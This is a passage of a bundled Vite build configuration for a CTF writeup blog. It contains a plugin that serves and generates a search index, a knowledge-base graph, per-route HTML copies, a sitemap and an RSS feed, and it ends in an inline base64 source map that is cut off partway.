    configureServer(server) {
      server.middlewares.use((req, res, next) => {
        const url = req.url || "";
        const send = (obj) => {
          res.setHeader("Content-Type", "application/json; charset=utf-8");
          res.end(JSON.stringify(obj));
        };
        if (url.includes("search-index.json")) return send(buildSearchIndex());
        if (url.includes("kb-graph.json")) return send(buildKbGraph());
        next();
      });
    },
    closeBundle() {
      const abs = (p) => join(outDir, p);
      if (!existsSync(abs("index.html"))) {
        console.warn("[seo-static] \u672A\u4EA7\u51FA index.html\uFF08\u6784\u5EFA\u53EF\u80FD\u5DF2\u5931\u8D25\uFF09\uFF0C\u8DF3\u8FC7\u9759\u6001\u751F\u6210");
        return;
      }
      const indexHtml = readFileSync(abs("index.html"));
      writeFileSync(abs("404.html"), indexHtml);
      writeFileSync(abs(".nojekyll"), "");
      const routes = [
        "/",
        "/challenges",
        "/about",
        "/guestbook",
        "/kb",
        ...Object.keys(articles).map((id) => `/article/${id}`),
        ...kbNames().map((n) => `/kb/${n}`)
      ];
      let made = 0;
      for (const r of routes) {
        if (r === "/") continue;
        try {
          const dir = abs(r.slice(1));
          mkdirSync(dir, { recursive: true });
          writeFileSync(join(dir, "index.html"), indexHtml);
          made++;
        } catch (e) {
          console.warn(`[seo-static] \u8DF3\u8FC7 ${r}\uFF1A${e.message}`);
        }
      }
      const urlOf = (r) => SITE + r.split("/").map((seg, i) => i === 0 ? "" : encodeURIComponent(seg)).join("/");
      writeFileSync(
        abs("sitemap.xml"),
        `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
` + routes.map((r) => `  <url><loc>${urlOf(r)}</loc></url>`).join("\n") + `
</urlset>
`
      );
      const now = (/* @__PURE__ */ new Date()).toUTCString();
      const items = Object.entries(articles).map(([id, a]) => {
        const link = `${SITE}/article/${id}`;
        return `    <item>
      <title>${xmlEsc(a.title)}</title>
      <link>${link}</link>
      <guid isPermaLink="true">${link}</guid>
      <pubDate>${now}</pubDate>
      <description>${xmlEsc(a.subtitle || a.title)}</description>
    </item>`;
      }).join("\n");
      writeFileSync(
        abs("rss.xml"),
        `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>heliumsenbrg's CTF Writeups</title>
    <link>${SITE}/</link>
    <description>CTF WriteUp \u535A\u5BA2 - Web \u5B89\u5168 / \u5BC6\u7801\u5B66 / \u4E8C\u8FDB\u5236\u5229\u7528</description>
    <language>zh-CN</language>
    <lastBuildDate>${now}</lastBuildDate>
${items}
  </channel>
</rss>
`
      );
      const searchIndex = buildSearchIndex();
      writeFileSync(abs("search-index.json"), JSON.stringify(searchIndex));
      const graph = buildKbGraph();
      writeFileSync(abs("kb-graph.json"), JSON.stringify(graph));
      console.log(
        `[seo-static] \u9884\u751F\u6210 ${made} \u6761\u8DEF\u7531 \xB7 sitemap ${routes.length} \u6761 \xB7 rss ${Object.keys(articles).length} \u7BC7 \xB7 \u641C\u7D22\u7D22\u5F15 ${searchIndex.items.length} \u6761 \xB7 \u56FE\u8C31 ${graph.nodes.length} \u8282\u70B9/${graph.edges.length} \u8FB9`
      );
    }
  };
}
var vite_config_default = defineConfig({
  // 环境感知：GitHub Pages 需要子路径，Vercel 根路径
  base: process.env.VERCEL ? "/" : "/ctf-writeup-blog/",
  plugins: [react(), seoStaticPlugin()],
  server: {
    host: "0.0.0.0",
    port: 3e3
  },
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          "framer-motion": ["framer-motion"],
          tsparticles: ["@tsparticles/react", "@tsparticles/slim", "tsparticles"],
          "react-vendor": ["react", "react-dom", "react-router-dom"]
        }
      }
    }
  },
  // 排除 public/gargantua 中的 import map 文件，避免 Vite 误扫描
  optimizeDeps: {
    entries: ["index.html", "src/**/*.{js,jsx}"]
  },
  // 测试（vitest 直接读取 vite 配置）
  test: {
    environment: "jsdom",
    include: ["tests/**/*.test.{js,jsx}"],
    setupFiles: ["./tests/setup.js"]
  }
});
export {
  vite_config_default as default
};
//# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsidml0ZS5jb25maWcuanMiLCAic3JjL2RhdGEvYXJ0aWNsZXMuanMiLCAic3JjL2RhdGEva2IvaW5kZXguanMiLCAic3JjL2RhdGEvY2hhbGxlbmdlcy5qcyJdLAogICJzb3VyY2VzQ29udGVudCI6IFsiY29uc3QgX192aXRlX2luamVjdGVkX29yaWdpbmFsX2Rpcm5hbWUgPSBcIkM6XFxcXFVzZXJzXFxcXGh3aFxcXFxibG9nXFxcXGZyb250ZW5kXCI7Y29uc3QgX192aXRlX2luamVjdGVkX29yaWdpbmFsX2ZpbGVuYW1lID0gXCJDOlxcXFxVc2Vyc1xcXFxod2hcXFxcYmxvZ1xcXFxmcm9udGVuZFxcXFx2aXRlLmNvbmZpZy5qc1wiO2NvbnN0IF9fdml0ZV9pbmplY3RlZF9vcmlnaW5hbF9pbXBvcnRfbWV0YV91cmwgPSBcImZpbGU6Ly8vQzovVXNlcnMvaHdoL2Jsb2cvZnJvbnRlbmQvdml0ZS5jb25maWcuanNcIjtpbXBvcnQgeyBkZWZpbmVDb25maWcgfSBmcm9tICd2aXRlJ1xuaW1wb3J0IHJlYWN0IGZyb20gJ0B2aXRlanMvcGx1Z2luLXJlYWN0J1xuaW1wb3J0IHsgd3JpdGVGaWxlU3luYywgbWtkaXJTeW5jLCByZWFkRmlsZVN5bmMsIGV4aXN0c1N5bmMgfSBmcm9tICdmcydcbmltcG9ydCBwYXRoIGZyb20gJ3BhdGgnXG5pbXBvcnQgeyBmaWxlVVJMVG9QYXRoIH0gZnJvbSAndXJsJ1xuaW1wb3J0IHsgam9pbiB9IGZyb20gJ3BhdGgnXG5pbXBvcnQgeyBhcnRpY2xlcyB9IGZyb20gJy4vc3JjL2RhdGEvYXJ0aWNsZXMuanMnXG5pbXBvcnQga2IgZnJvbSAnLi9zcmMvZGF0YS9rYi9pbmRleC5qcydcbmltcG9ydCB7IGFsbENoYWxsZW5nZXMgfSBmcm9tICcuL3NyYy9kYXRhL2NoYWxsZW5nZXMuanMnXG5cbi8qKiBcdTdBRDlcdTcwQjlcdTZCNjNcdTVGMEZcdTU3MzBcdTU3NDBcdUZGMDhjYW5vbmljYWwgXHU3NTI4IFBhZ2VzIFx1OTBBM1x1Njc2MVx1RkYwQ1ZlcmNlbCBcdTk1NUNcdTUwQ0ZcdTRFMERcdTRGNUMgY2Fub25pY2FsXHVGRjA5ICovXG5jb25zdCBTSVRFID0gJ2h0dHBzOi8vaGVsaXVtc2VuYnJnLmdpdGh1Yi5pby9jdGYtd3JpdGV1cC1ibG9nJ1xuXG5jb25zdCB4bWxFc2MgPSAocykgPT5cbiAgU3RyaW5nKHMpLnJlcGxhY2UoLyYvZywgJyZhbXA7JykucmVwbGFjZSgvPC9nLCAnJmx0OycpLnJlcGxhY2UoLz4vZywgJyZndDsnKS5yZXBsYWNlKC9cIi9nLCAnJnF1b3Q7JylcblxuY29uc3Qga2JOYW1lcyA9ICgpID0+IHtcbiAgY29uc3Qgb3V0ID0gW11cbiAgZm9yIChjb25zdCBzIG9mIGtiLnNlY3Rpb25zKSBmb3IgKGNvbnN0IGcgb2Ygcy5ncm91cHMpIGZvciAoY29uc3QgbiBvZiBnLm5vdGVzKSBvdXQucHVzaChuLm5hbWUpXG4gIHJldHVybiBvdXRcbn1cblxuLyoqXG4gKiBcdTc3RTVcdThCQzZcdTVFOTNcdTUxNzNcdTdDRkJcdTU2RkVcdTY1NzBcdTYzNkVcdUZGMUFcdTgyODJcdTcwQjkgPSBcdTdCMTRcdThCQjBcdUZGMDhcdTVFMjYgc2VjdGlvbi9ncm91cCBcdTc1MjhcdTRFOEVcdTkxNERcdTgyNzJcdUZGMDlcdUZGMENcdThGQjkgPSBsaW5rcy5pbnRlcm5hbFx1MzAwMlxuICogXHU4RkI5XHU0RjFBXHU1M0JCXHU5MUNEXHVGRjA4QVx1MjE5MkIgXHU0RTBFIEJcdTIxOTJBIFx1NTQwOFx1NUU3Nlx1RkYwOVx1RkYwQ1x1ODFFQVx1NzNBRlx1NEUyMlx1NUYwM1x1MzAwMlxuICovXG5mdW5jdGlvbiBidWlsZEtiR3JhcGgoKSB7XG4gIGNvbnN0IE5PVEVTX0RJUiA9IHBhdGguam9pbihmaWxlVVJMVG9QYXRoKG5ldyBVUkwoJy4nLCBpbXBvcnQubWV0YS51cmwpKSwgJ3NyYycsICdkYXRhJywgJ2tiJywgJ25vdGVzJylcbiAgY29uc3Qgbm9kZXMgPSBbXVxuICBjb25zdCBsaW5rcyA9IFtdXG5cbiAgZm9yIChjb25zdCBzIG9mIGtiLnNlY3Rpb25zKSB7XG4gICAgZm9yIChjb25zdCBnIG9mIHMuZ3JvdXBzKSB7XG4gICAgICBmb3IgKGNvbnN0IG4gb2YgZy5ub3Rlcykge1xuICAgICAgICBsZXQgYm9keSA9ICcnXG4gICAgICAgIHRyeSB7XG4gICAgICAgICAgYm9keSA9IEpTT04ucGFyc2UocmVhZEZpbGVTeW5jKHBhdGguam9pbihOT1RFU19ESVIsIGAke24ubmFtZX0uanNvbmApLCAndXRmOCcpKS5saW5rcz8uaW50ZXJuYWwgfHwgW11cbiAgICAgICAgfSBjYXRjaCB7XG4gICAgICAgICAgYm9keSA9IFtdXG4gICAgICAgIH1cbiAgICAgICAgbm9kZXMucHVzaCh7XG4gICAgICAgICAgaWQ6IG4ubmFtZSxcbiAgICAgICAgICB0aXRsZTogbi50aXRsZSB8fCBuLm5hbWUsXG4gICAgICAgICAgc2VjdGlvbjogcy5pZCxcbiAgICAgICAgICBzZWN0aW9uVGl0bGU6IHMudGl0bGUsXG4gICAgICAgICAgZ3JvdXA6IGcudGl0bGUsXG4gICAgICAgICAgbGlua3M6IGJvZHkubGVuZ3RoLFxuICAgICAgICB9KVxuICAgICAgICBmb3IgKGNvbnN0IHQgb2YgYm9keSkge1xuICAgICAgICAgIGlmICh0ID09PSBuLm5hbWUpIGNvbnRpbnVlXG4gICAgICAgICAgY29uc3QgYSA9IG4ubmFtZVxuICAgICAgICAgIGNvbnN0IGIgPSB0XG4gICAgICAgICAgY29uc3Qga2V5ID0gYSA8IGIgPyBgJHthfXx8JHtifWAgOiBgJHtifXx8JHthfWBcbiAgICAgICAgICBsaW5rcy5wdXNoKHsga2V5LCBzb3VyY2U6IGEsIHRhcmdldDogYiB9KVxuICAgICAgICB9XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLy8gXHU1M0JCXHU5MUNEICsgXHU0RTIyXHU1RjAzXHU2MzA3XHU1NDExXHU2NzJBXHU1M0QxXHU1RTAzXHU3QjE0XHU4QkIwXHU3Njg0XHU4RkI5XG4gIGNvbnN0IGlkcyA9IG5ldyBTZXQobm9kZXMubWFwKChuKSA9PiBuLmlkKSlcbiAgY29uc3Qgc2VlbiA9IG5ldyBTZXQoKVxuICBjb25zdCBlZGdlcyA9IFtdXG4gIGZvciAoY29uc3QgbCBvZiBsaW5rcykge1xuICAgIGlmIChzZWVuLmhhcyhsLmtleSkgfHwgIWlkcy5oYXMobC50YXJnZXQpKSBjb250aW51ZVxuICAgIHNlZW4uYWRkKGwua2V5KVxuICAgIGVkZ2VzLnB1c2goW2wuc291cmNlLCBsLnRhcmdldF0pXG4gIH1cblxuICAvLyBcdTVFQTZcdUZGMDhcdTUxQjNcdTVCOUFcdTgyODJcdTcwQjlcdTU5MjdcdTVDMEZcdUZGMDlcbiAgY29uc3QgZGVnID0gT2JqZWN0LmZyb21FbnRyaWVzKG5vZGVzLm1hcCgobikgPT4gW24uaWQsIDBdKSlcbiAgZm9yIChjb25zdCBbYSwgYl0gb2YgZWRnZXMpIHtcbiAgICBkZWdbYV0gKz0gMVxuICAgIGRlZ1tiXSArPSAxXG4gIH1cbiAgZm9yIChjb25zdCBuIG9mIG5vZGVzKSBuLmRlZ3JlZSA9IGRlZ1tuLmlkXVxuXG4gIHJldHVybiB7IGdlbmVyYXRlZEF0OiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCksIG5vZGVzLCBlZGdlcyB9XG59XG5cbi8qKlxuICogXHU1MTY4XHU3QUQ5XHU2NDFDXHU3RDIyXHU3RDIyXHU1RjE1XHVGRjA4XHU2Nzg0XHU1RUZBXHU2NUY2XHU3NTFGXHU2MjEwXHVGRjBDXHU5MDdGXHU1MTREXHU2MjhBXHU1MUUwXHU1MzQxXHU0RTA3XHU1QjU3XHU3Njg0XHU2QjYzXHU2NTg3XHU1ODVFXHU4RkRCXHU0RTNCXHU1MzA1XHVGRjA5XHVGRjFBXG4gKiAgIFx1OTg5OFx1ODlFMyAyNCArIFx1NzdFNVx1OEJDNlx1NUU5M1x1N0IxNFx1OEJCMCA2OSArIFx1NjMxMVx1NjIxOCA1MyBcdTIwMTRcdTIwMTQgXHU1M0VBXHU2NTM2XHU2ODA3XHU5ODk4L1x1NjQ1OFx1ODk4MS9cdTY4MDdcdTdCN0VcdThGRDlcdTdDN0JcdThGN0JcdTkxQ0ZcdTVCNTdcdTZCQjVcdTMwMDJcbiAqIFx1NEVBN1x1NzI2OVx1RkYxQWRpc3Qvc2VhcmNoLWluZGV4Lmpzb25cdUZGMENcdTUyNERcdTdBRUZcdTYzMDlcdTk3MDAgZmV0Y2hcdUZGMDhcdTIzMThLIFx1NjI1M1x1NUYwMFx1NjVGNlx1RkYwOVx1MzAwMlxuICovXG5mdW5jdGlvbiBidWlsZFNlYXJjaEluZGV4KCkge1xuICBjb25zdCBpdGVtcyA9IFtdXG5cbiAgZm9yIChjb25zdCBbaWQsIGFdIG9mIE9iamVjdC5lbnRyaWVzKGFydGljbGVzKSkge1xuICAgIGl0ZW1zLnB1c2goe1xuICAgICAgdHlwZTogJ3dyaXRldXAnLFxuICAgICAgcGF0aDogYC9hcnRpY2xlLyR7aWR9YCxcbiAgICAgIHRpdGxlOiBhLnRpdGxlIHx8IGlkLFxuICAgICAgc3ViOiBhLnN1YnRpdGxlIHx8ICcnLFxuICAgICAgLy8gXHU2QjYzXHU2NTg3XHU0RTVGXHU4RkRCXHU3RDIyXHU1RjE1XHVGRjFBXHU1MTk5XHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGXHU5MUNDXHU1RTM4XHU2NDFDXHU3Njg0XHU2NjJGIHBheWxvYWQvXHU1MUZEXHU2NTcwXHU1NDBEXHVGRjBDXHU1MTQ5XHU3NzBCXHU2ODA3XHU5ODk4XHU2NDFDXHU0RTBEXHU1MjMwXG4gICAgICB0ZXh0OiBgJHthLnRpdGxlIHx8ICcnfSAke2Euc3VidGl0bGUgfHwgJyd9ICR7YS5jb250ZW50IHx8ICcnfWAsXG4gICAgICB0YWdzOiBbXSxcbiAgICB9KVxuICB9XG5cbiAgY29uc3QgTk9URVNfRElSID0gcGF0aC5qb2luKGZpbGVVUkxUb1BhdGgobmV3IFVSTCgnLicsIGltcG9ydC5tZXRhLnVybCkpLCAnc3JjJywgJ2RhdGEnLCAna2InLCAnbm90ZXMnKVxuICBjb25zdCByZWFkTm90ZUJvZHkgPSAobmFtZSkgPT4ge1xuICAgIHRyeSB7XG4gICAgICByZXR1cm4gSlNPTi5wYXJzZShyZWFkRmlsZVN5bmMocGF0aC5qb2luKE5PVEVTX0RJUiwgYCR7bmFtZX0uanNvbmApLCAndXRmOCcpKS5jb250ZW50IHx8ICcnXG4gICAgfSBjYXRjaCB7XG4gICAgICByZXR1cm4gJydcbiAgICB9XG4gIH1cblxuICBmb3IgKGNvbnN0IHMgb2Yga2Iuc2VjdGlvbnMpIHtcbiAgICBmb3IgKGNvbnN0IGcgb2Ygcy5ncm91cHMpIHtcbiAgICAgIGZvciAoY29uc3QgbiBvZiBnLm5vdGVzKSB7XG4gICAgICAgIGl0ZW1zLnB1c2goe1xuICAgICAgICAgIHR5cGU6ICdub3RlJyxcbiAgICAgICAgICBwYXRoOiBgL2tiLyR7bi5uYW1lfWAsXG4gICAgICAgICAgdGl0bGU6IG4udGl0bGUgfHwgbi5uYW1lLFxuICAgICAgICAgIHN1Yjogbi5zdW1tYXJ5IHx8ICcnLFxuICAgICAgICAgIHRleHQ6IGAke24udGl0bGUgfHwgJyd9ICR7bi5uYW1lfSAke24uc3VtbWFyeSB8fCAnJ30gJHtyZWFkTm90ZUJvZHkobi5uYW1lKX1gLFxuICAgICAgICAgIHRhZ3M6IFtzLnRpdGxlLCBnLnRpdGxlXS5maWx0ZXIoQm9vbGVhbiksXG4gICAgICAgIH0pXG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgZm9yIChjb25zdCBjIG9mIGFsbENoYWxsZW5nZXMpIHtcbiAgICBpdGVtcy5wdXNoKHtcbiAgICAgIHR5cGU6ICdjaGFsbGVuZ2UnLFxuICAgICAgcGF0aDogJy9jaGFsbGVuZ2VzJyxcbiAgICAgIHRpdGxlOiBjLnRpdGxlIHx8IGMuc2x1ZyxcbiAgICAgIHN1YjogYy5kZXNjcmlwdGlvbiB8fCAnJyxcbiAgICAgIHRleHQ6IGAke2MudGl0bGUgfHwgJyd9ICR7Yy5zbHVnfSAke2MuZGVzY3JpcHRpb24gfHwgJyd9ICR7KGMudGFncyB8fCBbXSkuam9pbignICcpfWAsXG4gICAgICB0YWdzOiBbYy5wbGF0Zm9ybSwgYy5jYXRlZ29yeV0uZmlsdGVyKEJvb2xlYW4pLFxuICAgIH0pXG4gIH1cblxuICByZXR1cm4geyBnZW5lcmF0ZWRBdDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpLCBpdGVtcyB9XG59XG5cbi8qKlxuICogXHU2Nzg0XHU1RUZBXHU1NDBFXHU5NzU5XHU2MDAxXHU3NTFGXHU2MjEwXHVGRjFBXG4gKiAgXHUyNDYwIFx1NkJDRlx1Njc2MVx1OERFRlx1NzUzMVx1NEUwMFx1NEUyQVx1NzcxRiBpbmRleC5odG1sIFx1MjAxNFx1MjAxNCBHaXRIdWIgUGFnZXMgXHU1QkY5XHU0RTBEXHU1QjU4XHU1NzI4XHU3Njg0XHU4REVGXHU1Rjg0XHU0RjFBXHU4RDcwIDQwNC5odG1sXHVGRjBDXG4gKiAgICAgXHU1MTg1XHU1QkI5XHU4MEZEXHU2RTMyXHU2N0QzXHU0RjQ2KipcdTcyQjZcdTYwMDFcdTc4MDFcdTY2MkYgNDA0XHVGRjBDXHU2NDFDXHU3RDIyXHU1RjE1XHU2NENFXHU0RTBEXHU2NTM2XHU1RjU1KipcdTMwMDJcdTk4ODRcdTc1MUZcdTYyMTBcdTc2RUVcdTVGNTVcdTU0MEVcdTZERjFcdTk0RkVcdTc2RjRcdTYzQTUgMjAwXHUzMDAyXG4gKiAgXHUyNDYxIHNpdGVtYXAueG1sIFx1MjAxNFx1MjAxNCBcdTRFM0JcdThERUZcdTc1MzEgKyBcdTUxNjhcdTkwRThcdTY1ODdcdTdBRTAgKyBcdTUxNjhcdTkwRThcdTc3RTVcdThCQzZcdTVFOTNcdTdCMTRcdThCQjBcdUZGMDgqKlx1NEUwRFx1NTQyQlx1OTY5MFx1ODVDRlx1NUY2OVx1ODZDQiAvc2VjcmV0LXF1ZXN0KipcdUZGMDlcdTMwMDJcbiAqICBcdTI0NjIgcnNzLnhtbCBcdTIwMTRcdTIwMTQgaW5kZXguaHRtbCBcdTkxQ0MgPGxpbmsgcmVsPVwiYWx0ZXJuYXRlXCI+IFx1NjMwN1x1NTQxMVx1NUI4M1x1RkYwQ1x1NkI2NFx1NTI0RFx1NEUwMFx1NzZGNFx1NjYyRiA0MDRcdTMwMDJcbiAqICBcdTI0NjMgNDA0Lmh0bWwgXHU1MTVDXHU1RTk1ICsgLm5vamVreWxsXHVGRjA4XHU1MzlGIHNwYS1mYWxsYmFjayBcdTYzRDJcdTRFRjZcdTc2ODRcdTgwNENcdThEMjNcdUZGMENcdTRGRERcdTc1NTlcdUZGMDlcdTMwMDJcbiAqICBcdTI0NjQgc2VhcmNoLWluZGV4Lmpzb24gXHUyMDE0XHUyMDE0IFx1NTE2OFx1N0FEOVx1NjQxQ1x1N0QyMlx1NzUyOFx1RkYwOFx1OEY3Qlx1OTFDRlx1RkYxQVx1NjgwN1x1OTg5OC9cdTY0NThcdTg5ODEvXHU2ODA3XHU3QjdFXHVGRjA5XHUzMDAyXG4gKiBcdTc1MjggY29uZmlnUmVzb2x2ZWQgXHU1M0Q2XHU3NzFGXHU1QjlFIG91dERpclx1RkYwQ1x1NTIyQlx1NTE4RFx1Nzg2Q1x1N0YxNlx1NzgwMSAnZGlzdCdcdTMwMDJcbiAqL1xuZnVuY3Rpb24gc2VvU3RhdGljUGx1Z2luKCkge1xuICBsZXQgb3V0RGlyID0gJ2Rpc3QnXG4gIHJldHVybiB7XG4gICAgbmFtZTogJ3Nlby1zdGF0aWMnLFxuICAgIGFwcGx5OiAnYnVpbGQnLFxuICAgIGNvbmZpZ1Jlc29sdmVkKGNmZykge1xuICAgICAgb3V0RGlyID0gY2ZnLmJ1aWxkLm91dERpclxuICAgIH0sXG4gICAgLy8gZGV2IFx1NEUwQlx1NEU1Rlx1OEJBOVx1NjQxQ1x1N0QyMi9cdTU2RkVcdThDMzFcdTgwRkRcdTc1MjhcdUZGMDhcdTRFMERcdTUxOTlcdTc2RDhcdUZGMENcdTczQjBcdTdCOTdcdTczQjBcdTdFRDlcdUZGMDlcbiAgICBjb25maWd1cmVTZXJ2ZXIoc2VydmVyKSB7XG4gICAgICBzZXJ2ZXIubWlkZGxld2FyZXMudXNlKChyZXEsIHJlcywgbmV4dCkgPT4ge1xuICAgICAgICBjb25zdCB1cmwgPSByZXEudXJsIHx8ICcnXG4gICAgICAgIGNvbnN0IHNlbmQgPSAob2JqKSA9PiB7XG4gICAgICAgICAgcmVzLnNldEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnKVxuICAgICAgICAgIHJlcy5lbmQoSlNPTi5zdHJpbmdpZnkob2JqKSlcbiAgICAgICAgfVxuICAgICAgICBpZiAodXJsLmluY2x1ZGVzKCdzZWFyY2gtaW5kZXguanNvbicpKSByZXR1cm4gc2VuZChidWlsZFNlYXJjaEluZGV4KCkpXG4gICAgICAgIGlmICh1cmwuaW5jbHVkZXMoJ2tiLWdyYXBoLmpzb24nKSkgcmV0dXJuIHNlbmQoYnVpbGRLYkdyYXBoKCkpXG4gICAgICAgIG5leHQoKVxuICAgICAgfSlcbiAgICB9LFxuICAgIGNsb3NlQnVuZGxlKCkge1xuICAgICAgY29uc3QgYWJzID0gKHApID0+IGpvaW4ob3V0RGlyLCBwKVxuICAgICAgLy8gXHU2Nzg0XHU1RUZBXHU1OTMxXHU4RDI1XHU2NUY2XHU0RTBEXHU0RjFBXHU0RUE3XHU1MUZBIGluZGV4Lmh0bWwgXHUyMDE0XHUyMDE0IFx1OEZEOVx1OTFDQ1x1NUZDNVx1OTg3Qlx1NEYxOFx1OTZDNVx1OTAwMFx1NTFGQVx1RkYwQ1xuICAgICAgLy8gXHU1NDI2XHU1MjE5XHU2NzJDXHU2M0QyXHU0RUY2XHU2MjlCXHU3Njg0IEVOT0VOVCBcdTRGMUEqKlx1NzZENlx1NEY0Rlx1NzcxRlx1NkI2M1x1NzY4NFx1Njc4NFx1NUVGQVx1OTUxOVx1OEJFRioqXG4gICAgICBpZiAoIWV4aXN0c1N5bmMoYWJzKCdpbmRleC5odG1sJykpKSB7XG4gICAgICAgIGNvbnNvbGUud2FybignW3Nlby1zdGF0aWNdIFx1NjcyQVx1NEVBN1x1NTFGQSBpbmRleC5odG1sXHVGRjA4XHU2Nzg0XHU1RUZBXHU1M0VGXHU4MEZEXHU1REYyXHU1OTMxXHU4RDI1XHVGRjA5XHVGRjBDXHU4REYzXHU4RkM3XHU5NzU5XHU2MDAxXHU3NTFGXHU2MjEwJylcbiAgICAgICAgcmV0dXJuXG4gICAgICB9XG4gICAgICBjb25zdCBpbmRleEh0bWwgPSByZWFkRmlsZVN5bmMoYWJzKCdpbmRleC5odG1sJykpXG5cbiAgICAgIC8vIFx1MjQ2MyBcdTUxNUNcdTVFOTVcbiAgICAgIHdyaXRlRmlsZVN5bmMoYWJzKCc0MDQuaHRtbCcpLCBpbmRleEh0bWwpXG4gICAgICB3cml0ZUZpbGVTeW5jKGFicygnLm5vamVreWxsJyksICcnKVxuXG4gICAgICBjb25zdCByb3V0ZXMgPSBbXG4gICAgICAgICcvJyxcbiAgICAgICAgJy9jaGFsbGVuZ2VzJyxcbiAgICAgICAgJy9hYm91dCcsXG4gICAgICAgICcvZ3Vlc3Rib29rJyxcbiAgICAgICAgJy9rYicsXG4gICAgICAgIC4uLk9iamVjdC5rZXlzKGFydGljbGVzKS5tYXAoKGlkKSA9PiBgL2FydGljbGUvJHtpZH1gKSxcbiAgICAgICAgLi4ua2JOYW1lcygpLm1hcCgobikgPT4gYC9rYi8ke259YCksXG4gICAgICBdXG5cbiAgICAgIC8vIFx1MjQ2MCBcdTZCQ0ZcdTY3NjFcdThERUZcdTc1MzFcdTk4ODRcdTc1MUZcdTYyMTAgaW5kZXguaHRtbFx1RkYwOFx1NkRGMVx1OTRGRVx1OEZENFx1NTZERSAyMDBcdUZGMDlcbiAgICAgIGxldCBtYWRlID0gMFxuICAgICAgZm9yIChjb25zdCByIG9mIHJvdXRlcykge1xuICAgICAgICBpZiAociA9PT0gJy8nKSBjb250aW51ZVxuICAgICAgICB0cnkge1xuICAgICAgICAgIGNvbnN0IGRpciA9IGFicyhyLnNsaWNlKDEpKVxuICAgICAgICAgIG1rZGlyU3luYyhkaXIsIHsgcmVjdXJzaXZlOiB0cnVlIH0pXG4gICAgICAgICAgd3JpdGVGaWxlU3luYyhqb2luKGRpciwgJ2luZGV4Lmh0bWwnKSwgaW5kZXhIdG1sKVxuICAgICAgICAgIG1hZGUrK1xuICAgICAgICB9IGNhdGNoIChlKSB7XG4gICAgICAgICAgY29uc29sZS53YXJuKGBbc2VvLXN0YXRpY10gXHU4REYzXHU4RkM3ICR7cn1cdUZGMUEke2UubWVzc2FnZX1gKVxuICAgICAgICB9XG4gICAgICB9XG5cbiAgICAgIC8vIFx1MjQ2MSBzaXRlbWFwXG4gICAgICBjb25zdCB1cmxPZiA9IChyKSA9PlxuICAgICAgICBTSVRFICsgci5zcGxpdCgnLycpLm1hcCgoc2VnLCBpKSA9PiAoaSA9PT0gMCA/ICcnIDogZW5jb2RlVVJJQ29tcG9uZW50KHNlZykpKS5qb2luKCcvJylcbiAgICAgIHdyaXRlRmlsZVN5bmMoXG4gICAgICAgIGFicygnc2l0ZW1hcC54bWwnKSxcbiAgICAgICAgYDw/eG1sIHZlcnNpb249XCIxLjBcIiBlbmNvZGluZz1cIlVURi04XCI/Plxcbjx1cmxzZXQgeG1sbnM9XCJodHRwOi8vd3d3LnNpdGVtYXBzLm9yZy9zY2hlbWFzL3NpdGVtYXAvMC45XCI+XFxuYCArXG4gICAgICAgICAgcm91dGVzLm1hcCgocikgPT4gYCAgPHVybD48bG9jPiR7dXJsT2Yocil9PC9sb2M+PC91cmw+YCkuam9pbignXFxuJykgK1xuICAgICAgICAgIGBcXG48L3VybHNldD5cXG5gXG4gICAgICApXG5cbiAgICAgIC8vIFx1MjQ2MiByc3NcdUZGMDhcdTY1ODdcdTdBRTBcdTY1NzBcdTYzNkVcdTkxQ0NcdTZDQTFcdTY3MDlcdTY1RTVcdTY3MUZcdTVCNTdcdTZCQjVcdUZGMENcdTdFREZcdTc1MjhcdTY3ODRcdTVFRkFcdTY1RjZcdTk1RjRcdUZGMDlcbiAgICAgIGNvbnN0IG5vdyA9IG5ldyBEYXRlKCkudG9VVENTdHJpbmcoKVxuICAgICAgY29uc3QgaXRlbXMgPSBPYmplY3QuZW50cmllcyhhcnRpY2xlcylcbiAgICAgICAgLm1hcCgoW2lkLCBhXSkgPT4ge1xuICAgICAgICAgIGNvbnN0IGxpbmsgPSBgJHtTSVRFfS9hcnRpY2xlLyR7aWR9YFxuICAgICAgICAgIHJldHVybiAoXG4gICAgICAgICAgICBgICAgIDxpdGVtPlxcbmAgK1xuICAgICAgICAgICAgYCAgICAgIDx0aXRsZT4ke3htbEVzYyhhLnRpdGxlKX08L3RpdGxlPlxcbmAgK1xuICAgICAgICAgICAgYCAgICAgIDxsaW5rPiR7bGlua308L2xpbms+XFxuYCArXG4gICAgICAgICAgICBgICAgICAgPGd1aWQgaXNQZXJtYUxpbms9XCJ0cnVlXCI+JHtsaW5rfTwvZ3VpZD5cXG5gICtcbiAgICAgICAgICAgIGAgICAgICA8cHViRGF0ZT4ke25vd308L3B1YkRhdGU+XFxuYCArXG4gICAgICAgICAgICBgICAgICAgPGRlc2NyaXB0aW9uPiR7eG1sRXNjKGEuc3VidGl0bGUgfHwgYS50aXRsZSl9PC9kZXNjcmlwdGlvbj5cXG5gICtcbiAgICAgICAgICAgIGAgICAgPC9pdGVtPmBcbiAgICAgICAgICApXG4gICAgICAgIH0pXG4gICAgICAgIC5qb2luKCdcXG4nKVxuICAgICAgd3JpdGVGaWxlU3luYyhcbiAgICAgICAgYWJzKCdyc3MueG1sJyksXG4gICAgICAgIGA8P3htbCB2ZXJzaW9uPVwiMS4wXCIgZW5jb2Rpbmc9XCJVVEYtOFwiPz5cXG48cnNzIHZlcnNpb249XCIyLjBcIj5cXG4gIDxjaGFubmVsPlxcbmAgK1xuICAgICAgICAgIGAgICAgPHRpdGxlPmhlbGl1bXNlbmJyZydzIENURiBXcml0ZXVwczwvdGl0bGU+XFxuYCArXG4gICAgICAgICAgYCAgICA8bGluaz4ke1NJVEV9LzwvbGluaz5cXG5gICtcbiAgICAgICAgICBgICAgIDxkZXNjcmlwdGlvbj5DVEYgV3JpdGVVcCBcdTUzNUFcdTVCQTIgLSBXZWIgX